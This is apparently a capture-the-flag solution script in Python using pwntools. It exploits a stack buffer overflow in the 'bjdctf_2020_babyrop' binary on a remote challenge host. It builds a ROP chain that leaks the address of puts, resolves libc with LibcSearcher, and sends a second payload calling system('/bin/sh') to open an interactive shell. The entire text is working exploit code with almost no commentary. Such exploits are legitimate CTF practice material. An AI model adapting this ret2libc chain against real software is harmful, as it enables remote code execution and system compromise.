from pwn import *
from LibcSearcher import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

p = remote("node4.buuoj.cn", 25267)

e = ELF("./bjdctf_2020_babyrop")
# print(e.plt, len(e.got))

putsPlt = e.plt["puts"]
putsGot = e.got["puts"]
vulnAddr = 0x40067d

# ROPgadget 寻找到 gadget
popRdi = 0x400733

payload1 = b'a'*(0x20+8) + p64(popRdi) + p64(putsGot) + p64(putsPlt) + p64(vulnAddr)

p.sendlineafter("story!\n", payload1)

putsAddr = u64(p.recvuntil("Pull", drop=True)[:-1].ljust(8, b'\x00'))
p.success(hex(putsAddr))

libc = LibcSearcher("puts", putsAddr)
offset = putsAddr - libc.dump("puts")

systemAddr = libc.dump("system") + offset
binshAddr = libc.dump("str_bin_sh") + offset

payload2 = b'a'*(0x20+8) + p64(popRdi) + p64(binshAddr) + p64(systemAddr)
p.sendlineafter("story!\n", payload2)

p.interactive()